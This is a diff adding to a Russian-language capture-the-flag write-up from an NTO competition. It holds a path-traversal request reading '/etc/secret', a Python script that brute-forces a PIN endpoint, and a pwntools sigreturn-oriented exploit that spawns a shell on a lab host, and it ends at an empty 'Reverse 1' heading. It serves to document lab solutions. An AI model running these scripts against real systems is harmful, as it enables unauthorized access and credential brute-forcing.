@@ -42,3 +42,66 @@ download?file_type=../../../../../../../../../etc/secret
 ```
 
 Флаг: `nto{Ht1P_sM088Lin6_88Ti}`
+
+### Crypto 1
+
+На сервере существует эндпоинт для проверки пина, известно что пин - число и зашифрованный правильный пин маленького размера => Можно написать брутфорс
+
+Код брутфорса:
+```python
+import requests
+import time
+
+
+url = "http://192.168.12.12:5000/api"
+
+if __name__ == "__main__":
+    print()
+    for i in range(10 ** 10):
+        resp = requests.post(url + "/CheckPin", json={'pin': i})
+        if resp.status_code != 500:
+            print("!!!!{}!!!!".format(resp.json()))
+            break
+        else:
+            print(i)
+        time.sleep(0.01)
+```
+
+### PWN 2
+
+Решение бинарной уязвимости было взято из примеров: [ссылка1](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), [ссылка2](https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/syscalls/exploitation-with-syscalls.md)
+
+Код:
+```python
+from pwn import *
+
+elf = context.binary = ELF('./task')
+p = remote("192.168.12.13", 1555)
+
+binsh = elf.address + 0x1430
+
+POP_RAX = 0x41018
+POP_RDI = 0x1000001a
+POP_RSI = 0x1000001c
+POP_RDX = 0x1000001e
+SYSCALL = 0x41015
+
+frame = SigreturnFrame()
+frame.rax = 0x3b
+frame.rdi = binsh
+frame.rsi = 0x0
+frame.rdx = 0x0
+frame.rip = SYSCALL
+
+payload = b'A' * 8
+payload += p64(POP_RAX)
+payload += p64(0xF)
+payload += p64(SYSCALL)
+payload += bytes(frame)
+
+p.sendline(payload)
+p.interactive()
+```
+
+### Reverse 1
+
